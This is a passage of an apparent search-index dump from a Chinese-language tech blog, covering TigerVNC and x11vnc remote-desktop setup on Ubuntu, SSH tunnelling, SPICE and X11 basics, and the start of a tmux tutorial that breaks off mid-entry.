<p>\u53ef\u4ee5\u770b\u5230\u5305\u542b<code>/usr/bin/tigervncserver</code>\uff0c\u5373\u4e3a\u6211\u4eec\u9700\u8981\u7684\u3002\u540c\u65f6\u8fd8\u5305\u542b\u4e00\u4e2a systemd \u670d\u52a1\u6a21\u677f\u2014\u2014<code>/lib/systemd/system/tigervncserver@.service</code>\uff0c\u8bf4\u660e\u53ef\u4ee5\u4f7f\u7528 systemd \u542f\u52a8 vnc server</p> </li> </ul> <ul> <li> <p>\u5b89\u88c5</p> <pre><code>sudo apt install tigervnc-standalone-server\n</code></pre> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8fde\u63a5\u5bc6\u7801","title":"\u8fde\u63a5\u5bc6\u7801","text":"<p>\u5176\u5b83 vncserver\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u65f6\u4f1a\u8ba9\u7528\u6237\u8bbe\u7f6e\u5bc6\u7801\uff0c\u5982</p> <pre><code>vncserver -localhost no #\u8bbe\u7f6e\u4e3ano localhost\uff0c\u4e0d\u7136\u53ea\u80fd\u5728\u672c\u8ba1\u7b97\u673a\u4e0a\u8bbf\u95ee\uff08LAN\u5185\u7684\u90fd\u4e0d\u884c\uff09\u3002\n</code></pre> <p>tigervnc 1.10 \u540e\u867d\u7136\u4e0d\u5e94\u4f7f\u7528 vncserver \u6765\u542f\u52a8\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8be5\u65b9\u5f0f\u8bbe\u7f6e\u5bc6\u7801\u3002</p> <p>\u521b\u5efa\u5bc6\u7801\u540e\uff0c\u4f1a\u751f\u6210~/.vnc/passwd \u6587\u4ef6\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u914d\u7f6e-vncserver","title":"\u914d\u7f6e vncserver","text":"<p>\u6211\u4eec\u9700\u8981\u914d\u7f6e$HOME/.vnc/tigervnc.conf\uff0c\u793a\u4f8b\u914d\u7f6e\u5982\u4e0b\uff0c\u5176\u4e2d\u53ea\u6709 session \u662f\u5fc5\u987b\u7684\uff0c\u5bf9\u5e94<code>/usr/share/xsessions</code>\u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a\u684c\u9762\u73af\u5883\u3002</p> <pre><code>$session=ubuntu;\n$geometry = \"1920x1080\";\n$localhost = \"no\";\n#$depth = \"24\";\n#$pixelformat = \"rgb888\";\n$SecurityTypes = \"VncAuth,TLSVnc\";\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u914d\u7f6e\u7684\u8bf4\u660e","title":"\u914d\u7f6e\u7684\u8bf4\u660e","text":"<ul> <li>\u67e5\u770b man tigervnc.conf(5x)</li> <li>\u67e5\u770b<code>/etc/tigervnc/vncserver-config-defaults</code></li> <li>\u53ef\u67e5\u770b<code>/lib/systemd/system/tigervncserver@.service</code>\u6ce8\u91ca\u8bf4\u660e</li> </ul> <p>\u67e5\u770b<code>man tigervnc.conf(5x)</code>\u53ef\u4ee5\u77e5\u9053\uff0c\u4ee5\u4e0b\u56db\u7ea7\u914d\u7f6e\u4f9d\u6b21\u751f\u6548\uff0c\u540e\u8005\u8986\u76d6\u524d\u8005\uff1avncserver-config-defaults, $HOME/.vnc/tigervnc.conf, command-line option, vncserver-config-mandatory</p> <p>\u5177\u4f53\u914d\u7f6e\u53ef\u67e5\u770b<code>/etc/tigervnc/vncserver-config-defaults</code></p> <p>user assign</p> <pre><code>#/etc/tigervnc/vncserver.users\n</code></pre> <p>startup script</p> <ul> <li>\u76f8\u5f53\u4e8e\u8bf4\u9ed8\u8ba4\u6761\u4ef6\u4e0b\uff1a<code>$vncUserDir/Xtigervnc-session</code>\uff0c<code>$vncUserDir/xstartup</code>\uff0c<code>/etc/X11/Xtigervnc-session</code>\u91cd\u8981\u6027\u4f9d\u6b21\u964d\u4f4e\uff0c\u53ea\u6709\u524d\u8005\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u6267\u884c\u540e\u8005\u3002</li> </ul> <pre><code># $vncStartup points to a script that will be started at the very beginning\n# when neither $vncUserDir/Xtigervnc-session nor $vncUserDir/xstartup is present.\n# If $vncUserDir/Xtigervnc-session is present, it will be used. Otherwise, we try\n# $vncUserDir/xstartup. If this is also absent, then we use the script given by\n# $vncStartup. If $vncStartup is specified in $vncUserDir/tigervnc.conf, then this\n# script is used unconditionally. That is without checking for the presence of\n# $vncUserDir/Xtigervnc-session or $vncUserDir/xstartup.\n#\n# Default: $vncStartup = \"/etc/X11/Xtigervnc-session\";\n</code></pre> <p>session(\u684c\u9762\u73af\u5883)\uff0c\u5fc5\u987b\u8bbe\u7f6e</p> <ul> <li> <p>ubuntu22.04 \u5b89\u88c5\u4e86 xfce4 \u540e\u7684<code>/usr/share/xsessions</code></p> <ul> <li>ubuntu.desktop\uff1a\u4f7f\u7528 wayland \u66ff\u4ee3 X windows system</li> </ul> <ul> <li>ubuntu-xorg.desktop\uff1a\u4f7f\u7528 X windows system</li> <li>xfce.desktop</li> </ul> </li> </ul> <pre><code># The $session option controls which X session type will be started. This\n# should match one of the files in /usr/share/xsessions. For example, if there\n# is a file called gnome.desktop, then $session = \"gnome\" would start this X\n# session. The command to start the session is passed to the $vncStartup\n# script. If this is not specified, then /etc/X11/Xtigervnc-session will start\n# the session specified by /usr/bin/x-session-manager.\n#\n# Default: $session = undef;\n</code></pre> <p>\u5176\u5b83</p> <pre><code>#\u663e\u793a\u5668\u51e0\u4f55\u5927\u5c0f\n# Default: $geometry = \"1920x1200\";\n\n#\u989c\u8272\n# $depth       sets the framebuffer color depth. Must be one of 16, 24, or 32.\n# $pixelformat sets the default pixelformat.\n#              A default can be derived if the tigervncserver is run in a\n#              X session -- either $ENV{DISPLAY} or the session given by\n#              $getDefaultFrom -- with the -xdisplaydefaults option. The depth\n#              and pixelformat can also be changed at the commandline with\n#              the -depth and -pixelformat options. Otherwise, the fixed\n#              defaults provided below for the two settings will be used.\n# Example: $depth = \"16\";\n#          $pixelformat = \"rgb565\";\n# Default: $depth = \"24\";\n# Default: $pixelformat = undef;\n\n#\u662f\u5426\u672c\u5730\u624d\u80fd\u8bbf\u95ee\n# Default: $localhost = \"yes\"; # if $SecurityTypes does not contain any TLS*\n#                              #    or X509* security types or the $SecurityTypes\n#                              #    does contain at least on *None security type.\n# Default: $localhost = \"no\";  # Otherwise\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<p>systemd \u7248\u672c</p> <pre><code>sudo systemctl start tigervncserver@:1 #\u6ce8\u610f\u662f:1\u4e0d\u662f1\n\nsudo systemctl enable tigervncserver@:1 #\u5f00\u673a\u81ea\u542f\u52a8\nsudo systemctl stop tigervncserver@:1 \n</code></pre> <p>\u57fa\u672c\u64cd\u4f5c</p> <p>(\u4f7f\u7528 sudo \u770b\u5230\u7684\u662f root \u7528\u6237\u5f00\u542f\u7684\uff0c\u770b\u4e0d\u5230\u666e\u901a\u7528\u6237)</p> <pre><code>vncserver -list    #\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684server\u3002 \u5728tightvnc\u4e2d\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\uff0c\u9700\u8981\u901a\u8fc7\u67e5\u770b~/.vnc\u76ee\u5f55\u6765\u67e5\u770b\nvncserver -kill :number  #\u505c\u6b62\u6307\u5b9a\u7684server\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u96a7\u9053","title":"\u96a7\u9053","text":"<p>-localhost yes \u65f6\uff0c\u53ea\u80fd\u5728 127.0.0.1 \u4e0a\u8bbf\u95ee vncserver\uff0c\u9700\u8981\u5229\u7528 ssh \u5728\u5ba2\u6237\u7aef\u4e0a\u548c\u670d\u52a1\u5668\u4e0a\u5efa\u7acb\u4e00\u6761\u96a7\u9053\u3002</p> <pre><code>ssh -L 5901:localhost:5901 -C -N user@address -p PORT\nssh -L 5901:localhost:5901 -C -N rzyen #\n</code></pre> <ul> <li> <p>-L 5901:localhost:5901</p> <p>The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</p> </li> </ul> <ul> <li>-C: This argument speeds up processes and minimizes resource usage.</li> </ul> <ul> <li>-N: This argument prevents execution of remote commands and tells SSH to only forward ports</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u95ee\u9898_1","title":"\u95ee\u9898","text":"<ul> <li> <p>\u8fdc\u7a0b\u8bbf\u95ee\u754c\u9762\u548c\u672c\u5730\u6709\u4e9b\u4e0d\u4e00\u6837\u3002\u6bd4\u5982\u4fa7\u8fb9\u680f\u81ea\u52a8\u9690\u85cf\u4e86\uff0c\u53ea\u6709\u6309 win \u952e\u624d\u4f1a\u51fa\u73b0\u3002</p> <ul> <li> <p>systemd can't start on ubuntu 20.04 with error: No user configured for display 1 \u00b7 Issue #1168 \u00b7 TigerVNC/tigervnc (github.com)</p> <p>Gnome session doesn't load users' settings, it loads defaults. For instance, how dock should look  And how it is right now: </p> </li> </ul> <ul> <li>\u4f7f\u7528 wayland \u7248\u7684 ubuntu DE \u4e0d\u4f1a\u9047\u5230</li> </ul> </li> </ul> <ul> <li> <p>\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff0c\u8fde\u63a5\u540e\u53ef\u4ee5\u770b\u5230\u4e00\u53cc\u773c\u775b</p> <pre><code>tigervncserver -xstartup /usr/bin/xeyes\n</code></pre> </li> </ul> <ul> <li> <p>\u4e0d\u540c\u7684\u547d\u4ee4\u5230\u5e95\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f</p> <pre><code>tigervncconfig\ntigervncpasswd\ntigervncserver\ntigervncsession\nXtigervnc\n</code></pre> <ul> <li> <p>man Xvnc</p> <p>Xtigervnc is the X VNC (Virtual Network Computing) server.  It is based on a standard X server, but it has a \"virtual\" screen rather than a physical one.  X applications display themselves on it as if it were a normal X display, but they can only  be  accessed  via  a  VNC  viewer  -  see vncviewer(1).</p> <p>So  Xtigervnc  is really two servers in one. To the applications it is an X server, and to the remote VNC users it is a VNC server.</p> </li> </ul> <ul> <li> <p>man vncserver</p> <p>tigervncserver  is  used  to  start a TigerVNC (Virtual Network Computing) desktop. tigervncserver is a Perl wrapper script which simplifies the process of starting an instance of the TigerVNC server Xtigervnc.</p> <p>It runs Xtigervnc with appropriate options and starts some X  applications  to be displayed in the TigerVNC desktop.</p> </li> </ul> <ul> <li> <p>/etc/X11/Xsession</p> <p>global Xsession file -- used by display managers and xinit (startx)</p> <p>\u800c vncserver \u9ed8\u8ba4\u4f1a\u8c03\u7528\u8be5\u811a\u672c</p> </li> </ul> </li> </ul> <ul> <li> <p>tigervnc1.12.0 \u76f4\u63a5\u4f7f\u7528 vncserver \u542f\u52a8\u62a5\u9519\uff08\u8fd9\u8bf4\u660e\u4e86\u5fc5\u987b\u4f7f\u7528 systemd \u542f\u52a8\uff09</p> <p>\u76f4\u63a5\u8fd0\u884c\u8be5\u547d\u4ee4\u4f1a\u62a5 warnning \u4fe1\u606f</p> <pre><code>\u279c  ~ vncserver -localhost no\nvncserver: Warning: No X session desktop file or command for 0\n</code></pre> <p>\u6b64\u65f6 vnc \u76f4\u63a5\u8fde\u63a5\uff0c\u53ea\u6709\u4e00\u4e2a\u9ed1\u767d\u7a97\u53e3\u663e\u793a<code>Xsession: unable to launch \"0\" X session --- \"0\" not found; falling back to default session</code></p> </li> </ul> <ul> <li> <p>\u65e2\u7136 X windows System \u672c\u8eab\u5c31\u652f\u6301\u7f51\u7edc\u663e\u793a\u3002\u4e3a\u4ec0\u4e48\u4e0d\u5728\u5ba2\u6237\u7aef\u4e0a\u8dd1\u4e00\u4e2a X server\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u7684 X client \u4e0d\u4e45\u53ef\u4ee5\u8fdc\u7a0b\u663e\u793a\u5230\u5ba2\u6237\u7aef\u4e0a\u4e86\u5417\uff1f</p> <p>man Xvnc  (tigervnc 1.10)</p> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x11vnc","title":"x11vnc","text":"<ul> <li>X11vnc - ArchWiki (archlinux.org)</li> </ul> <p>x11vnc is a VNC server, it allows one to view remotely and interact with real X displays (i.e. a display corresponding to a physical monitor, keyboard, and mouse) with any VNC viewer. While it is not developed any longer by its original author Karl Runge, LibVNC and the GitHub community have taken over the development.</p> <p>x11vnc does not create an extra display (or X desktop) for remote control. Instead, it shows in real time the existing X11 display, unlike Xvnc, part of TigerVNC, which is an alternative VNC server available in the official repositories.</p> <p>Also note that x11vnc is not shipped with a client viewer. Any VNC viewer should do the job and be compatible with the x11vnc server while not necessarily using all its functionalities. TigerVNC's vncviewer is a recommended client.</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4e0d\u540c\u70b9","title":"\u4e0d\u540c\u70b9","text":"<ul> <li> <p>x11vnc \u548c tigervnc, tightvnc \u7684\u4e0d\u540c</p> <ul> <li>\u9700\u8981 remote \u7aef\u5b9e\u9645\u63d2\u4e0a\u663e\u793a\u5668</li> <li>local \u7aef (\u63a7\u5236\u7aef) \u7684\u753b\u9762\u548c remote \u663e\u793a\u5668\u663e\u793a\u76f8\u540c\u7684\u753b\u9762</li> </ul> <p>\u56e0\u6b64\u9002\u5408\u8fdc\u7a0b\u534f\u52a9\u573a\u666f</p> </li> </ul> <ul> <li>\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u5361\u987f\u6709\u70b9\u5927\uff0c\u8fdc\u4e0d\u5982 tigervnc \u6d41\u7545\uff0c\u5c5e\u4e8e\u52c9\u5f3a\u80fd\u7528\u6c34\u5e73\u3002</li> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u526a\u8d34\u677f\u4e0d\u8d77\u4f5c\u7528</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<pre><code>x11vnc -display :0\n</code></pre> <p>\u8fd0\u884c\u65f6\u4f1a\u8f93\u51fa\u4e00\u4e9b guideline\uff0c\u6309\u7167\u5176\u4e00\u6b65\u4e00\u6b65\u6765\u5373\u53ef</p> <ul> <li> <p>running X server</p> <pre><code>An X server (the one you wish to view) must be running before x11vnc is\n   started: x11vnc does not start the X server.  (however, see the -create\n   option if that is what you really want).\n</code></pre> </li> </ul> <ul> <li> <p>\u6307\u5b9a X Display</p> <pre><code>** You must use -display &lt;disp&gt;, -OR- set and export your $DISPLAY\n   environment variable to refer to the display of the desired X server.\n - Usually the display is simply \":0\" (in fact x11vnc uses this if you forget\n   to specify it), but in some multi-user situations it could be \":1\", \":2\",\n   or even \":137\".  Ask your administrator or a guru if you are having\n   difficulty determining what your X DISPLAY is.\n</code></pre> </li> </ul> <ul> <li> <p>auth</p> <pre><code>** Next, you need to have sufficient permissions (Xauthority)\n   to connect to the X DISPLAY.   Here are some Tips:\n\n - Often, you just need to run x11vnc as the user logged into the X session.\n   So make sure to be that user when you type x11vnc.\n - Being root is usually not enough because the incorrect MIT-MAGIC-COOKIE\n   file may be accessed.  The cookie file contains the secret key that\n   allows x11vnc to connect to the desired X DISPLAY.\n - You can explicitly indicate which MIT-MAGIC-COOKIE file should be used\n   by the -auth option, e.g.:\n       x11vnc -auth /home/someuser/.Xauthority -display :0\n       x11vnc -auth /tmp/.gdmzndVlR -display :0\n   you must have read permission for the auth file.\n   See also '-auth guess' and '-findauth' discussed below.\n</code></pre> <p>\u65e0\u4eba\u767b\u5f55</p> <pre><code>If NO ONE is logged into an X session yet, but there is a greeter login\n   program like \"gdm\", \"kdm\", \"xdm\", or \"dtlogin\" running, you will need\n   to find and use the raw display manager MIT-MAGIC-COOKIE file.\n   Some examples for various display managers:\n\n     gdm:     -auth /var/gdm/:0.Xauth\n              -auth /var/lib/gdm/:0.Xauth\n     kdm:     -auth /var/lib/kdm/A:0-crWk72\n              -auth /var/run/xauth/A:0-crWk72\n     xdm:     -auth /var/lib/xdm/authdir/authfiles/A:0-XQvaJk\n     dtlogin: -auth /var/dt/A:0-UgaaXa\n   Sometimes the command \"ps wwwwaux | grep auth\" can reveal the file location.\n\n   Starting with x11vnc 0.9.9 you can have it try to guess by using:\n\n              -auth guess\n\n   (see also the x11vnc -findauth option.)\n\n   Only root will have read permission for the file, and so x11vnc must be run\n   as root (or copy it).  The random characters in the filenames will of course\n   change and the directory the cookie file resides in is system dependent.\n</code></pre> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5ba2\u6237\u7aef","title":"\u5ba2\u6237\u7aef","text":"<p>realvnc \u5ba2\u6237\u7aef\uff0cwindows \u4e0b\u6709\u5355\u6587\u4ef6\u8fd0\u884c\u7248\u672c</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#novncweb-\u5ba2\u6237\u7aef","title":"noVNC(web \u5ba2\u6237\u7aef)","text":"<p>VNC \u53ef\u4ee5\u5b9e\u73b0\u6d4f\u89c8\u5668\u7248\u672c\u7684\u5ba2\u6237\u7aef\u2014\u2014noVNC</p> <p>\u9700\u8981\u5728\u670d\u52a1\u7aef\u5b89\u88c5\u54cd\u5e94\u8f6f\u4ef6\u6765\u5b9e\u73b0 websocket \u4ee3\u7406\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5176\u5b83-remote-desktop","title":"\u5176\u5b83 remote desktop","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#spice","title":"spice","text":"<p>Simple Protocol for Independent Computing Environments - Wikipedia</p> <ul> <li> <p>SPICE \u6700\u521d\u7528\u4f5c\u865a\u62df\u673a\u663e\u793a\uff0c\u6709\u7740\u4e0d\u9519\u7684\u6027\u80fd</p> <ul> <li>\u534a\u865a\u62df\u5316</li> </ul> <ul> <li> <p>The QEMU binary links to the spice-server library to provide this capability and implements the QXL paravirtualized framebuffer device to enable the guest OS to take advantage of the performance benefits the SPICE protocol offers.</p> </li> </ul> </li> </ul> <ul> <li>virt-viewer \u9ed8\u8ba4</li> </ul> <ul> <li>\u73b0\u5728\u4e5f\u53ef\u4ee5\u7ed3\u5408 xorg \u7528\u4e8e remote desktop connection (Xspice)</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x11-\u539f\u7406","title":"X11 \u539f\u7406","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u67e5\u770b\u6b63\u5728\u8fd0\u884c\u7684-x-server","title":"\u67e5\u770b\u6b63\u5728\u8fd0\u884c\u7684 X server","text":"<ul> <li> <p>ssh - Is there a command to list all open displays on a machine? - Unix &amp; Linux Stack Exchange</p> <p>\u539f\u7406\u662f\u672c\u5730\u8fd0\u884c\u7684 X server \u548c X client \u95f4\u7684\u901a\u4fe1\u662f\u901a\u8fc7\u5171\u4eab\u5185\u5b58\u65b9\u5f0f\u5b9e\u73b0\u7684</p> <pre><code>\u279c  ~ ls /tmp/.X11-unix\nX0\n</code></pre> <p>\u5f00\u542f tigervnc \u540e\u4f1a\u51fa\u73b0 X1</p> </li> </ul> <ul> <li> <p>\u767b\u5f55\u4e86 gdm \u540e\uff0cgdm \u542f\u52a8 X server\u3002</p> <pre><code>ps aux |grep xorg\nyfy         4380  4.7  1.0 1064284 81108 tty2    Sl+  14:11   0:00 /usr/lib/xorg/Xorg vt2 -displayfd 3 -auth /run/user/1000/gdm/Xauthority -background none -noreset -keeptty -verbose 3\nyfy         4997  0.0  0.0  12132   716 pts/0    S+   14:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox xorg\n</code></pre> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#x-server-display","title":"X server, display","text":"<ul> <li> <p>x11 - What are X server, display and screen? - Unix &amp; Linux Stack Exchange</p> <p></p> </li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#boot-to-text-prompt","title":"boot to text prompt","text":"<pre><code>sudo systemctl set-default multi-user.target\n#sudo systemctl set-default graphical.target\n\nsudo reboot\n</code></pre> <ul> <li>ctrl + alt + F2 \u8fdb\u5165 tty2\u3002\u7c7b\u4f3c\u7684 (F1, F3, ...)</li> </ul> <ul> <li> <p>\u5373\u4f7f\u662f\u5728 text \u6a21\u5f0f\u4e0b\uff0c\u5f00\u542f display manager\uff0c\u4f1a\u7acb\u9a6c\u8fdb\u5165 GUI \u754c\u9762\uff0c\u767b\u5f55\u540e\u4e00\u5207\u6b63\u5e38\u3002</p> <pre><code>sudo systemctl start gdm3\n</code></pre> </li> </ul> <ul> <li> <p>\u540c\u6837\u7684\uff0c\u5728 GUI \u754c\u9762\uff0c\u5173\u95ed display manager \u540e\uff0cctrl-alt-F2 \u8fdb\u5165 text prompt</p> <pre><code>sudo systemctl stop gdm3\n</code></pre> </li> </ul> <ul> <li>\u5728 text \u6a21\u5f0f\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528 tiger vnc</li> </ul> <p>\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\uff0c\u53ef\u4ee5\u770b\u4e0b systemd \u8fc7\u7a0b</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55","title":"\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55","text":"<ul> <li> <p>Display Power Management Signaling - ArchWiki (archlinux.org)</p> <ul> <li>Standby\uff0csuspend\uff0coff \u662f\u4e0d\u540c\u7701\u7535\u7ea7\u522b\uff0c\u4f46\u662f\u662f\u9488\u5bf9 CRT \u663e\u793a\u5668\u7684\uff0c\u5bf9\u4e8e LCD \u663e\u793a\u5668\u5747\u76f8\u540c\u3002</li> </ul> <pre><code>Command Description\nxset s off Disable screen saver blanking\nxset s 3600 3600 Change blank time to 1 hour\nxset -dpms Turn off DPMS\nxset s off -dpms Disable DPMS and prevent screen from blanking\nxset dpms force off Turn off screen immediately\nxset dpms force standby Standby screen\nxset dpms force suspend Suspend screen\n</code></pre> </li> </ul> <ul> <li>\u7b14\u8bb0\u672c\u5173\u95ed\u5c4f\u5e55\uff0c\u53ea\u662f\u51fa\u4e8e\u7701\u7535\u3002\u5173\u95ed\u53f0\u5f0f\u673a\u663e\u793a\u5668\u7535\u6e90\u5e94\u89c6\u4e3a\u6ca1\u6709\u63d2\u5c4f\u5e55\u3002</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/","title":"tmux","text":"<p>tmux</p>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#tmux-\u57fa\u7840","title":"tmux \u57fa\u7840","text":"","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#tmux-\u8fd0\u884c\u547d\u4ee4","title":"tmux \u8fd0\u884c\u547d\u4ee4","text":"<p>tmux \u6709\u4e24\u79cd\u8fd0\u884c\u547d\u4ee4\u7684\u65b9\u5f0f\uff1a</p> <ul> <li>\u5728\u7ec8\u7aef\u4e2d\u8fd0\u884c\u5b8c\u6574\u547d\u4ee4\uff0c\u5982 <code>tmux list-session</code></li> <li>\u8fdb\u5165 tmux session \u4e2d\uff0c\u901a\u8fc7\u5feb\u6377\u952e\u5524\u8d77\u547d\u4ee4\u884c\uff08<code>prefix + :</code>\uff09\u7136\u540e\u8f93\u5165\u5b8c\u6574\u547d\u4ee4\u3002\u6bd4\u5982\u8f93\u5165<code>kill-session</code> \u5173\u95ed session</li> <li>\u8fdb\u5165 tmux \u540e\uff0c\u8f93\u5165\u5404\u79cd\u5feb\u6377\u952e\u3002\u6bd4\u5982\u9ed8\u8ba4 <code>prefix + ctrl-c</code> \u521b\u5efa\u65b0\u7684 sesson\u3002\u5404\u79cd\u5feb\u6377\u952e\u672c\u8d28\u4e5f\u662f\u5bf9 tmux \u547d\u4ee4\u7684\u8c03\u7528\u3002\u5feb\u6377\u952e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7 <code>bind</code> \u5b9a\u4e49\u3002<ul> <li>\u914d\u7f6e\u6587\u4ef6\uff1a/etc/tmux.conf, ~/.tmux.conf</li> </ul> </li> </ul>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#session-window-panel-\u6982\u5ff5","title":"session, window, panel \u6982\u5ff5","text":"<p>session \u8868\u793a\u4e00\u7ec4\u8fdb\u7a0b\uff0csession \u662f tmux \u6700\u5927\u7684\u4e00\u4e2a\u7c92\u5ea6\u3002session \u4e0b\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a window\uff0cwindows \u53ef\u4ee5\u521b\u5efa panel\u3002</p> <p>\u901a\u8fc7 session \u76f8\u5173\u547d\u4ee4\u7ba1\u7406 session\uff0c\u800c window, panel \u5219\u4e00\u822c\u901a\u8fc7\u5feb\u6377\u952e\u3002</p> <p>\u5217\u51fa session\uff0c\u5e76\u8fdb\u5165</p> <pre><code>tmux ls\ntmux a          #\u81ea\u52a8 attach \u6700\u8fd1\u4e00\u4e2a\ntmux a -t session_name\n</code></pre> <p>\u521b\u5efa session</p> <pre><code>tmux new -s session_name\ntmux                         # session name \u91c7\u7528\u6570\u5b57\u81ea\u52a8\u7f16\u53f7\n\nprefix + ctrl-c  # \u5feb\u6377\u952e\n</code></pre> <p>\u5220\u9664 session</p> <pre><code>tmux kill-session -s session_name\n\n# \u6ca1\u6709\u5feb\u6377\u952e\uff0c\u63a8\u8350\uff1a`prefix :kill-session`\n</code></pre> <p>\u91cd\u547d\u540d session</p> <pre><code>tmux rename-session -t session1 new_session_name\n\nprefix + $   # 